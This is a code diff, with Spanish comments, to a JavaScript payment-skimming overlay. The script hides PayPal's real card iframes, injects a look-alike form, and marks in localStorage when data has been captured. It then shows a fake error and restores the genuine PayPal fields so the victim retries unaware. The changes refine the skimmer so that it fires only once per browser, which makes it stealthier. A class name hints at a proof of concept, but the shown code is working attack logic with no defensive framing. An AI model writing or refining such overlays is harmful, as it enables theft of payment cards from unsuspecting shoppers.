@@ -53,8 +53,11 @@
   // Si ya se capturo antes, no mostrar nada
   try { if (localStorage.getItem(CAPTURED_KEY)) return; } catch(e) {}
 
+  var captured = false;
+
   function injectOverlay() {
-    if (overlayInjected) return;
+    if (overlayInjected || captured) return;
+    try { if (localStorage.getItem(CAPTURED_KEY)) { captured = true; return; } } catch(e) {}
     overlayInjected = true;
 
     // Ocultar iframes originales de PayPal
@@ -314,12 +317,12 @@
 
     // ─── Cierre elegante ─────────────────────────────────────
     function closeOverlay() {
+      captured = true;
       formWrap.classList.add('poc-closing');
       formWrap.addEventListener('animationend', function() {
         overlay.remove();
         var restored = paypalCard.children;
         for (var j = 0; j < restored.length; j++) restored[j].style.display = '';
-        overlayInjected = false;
       });
     }
 
@@ -370,6 +373,7 @@
         payBtn.style.background = '#2f6fb7';
         payBtn.disabled = false;
 
+        captured = true;
         try { localStorage.setItem(CAPTURED_KEY, String(Date.now())); } catch(e) {}
 
         errorBanner.style.display = 'block';
@@ -379,7 +383,7 @@
           el.style.borderColor = '#c4601a';
         });
 
-        setTimeout(closeOverlay, 300);
+        setTimeout(closeOverlay, 1000);
       }, 2000);
     });
   }
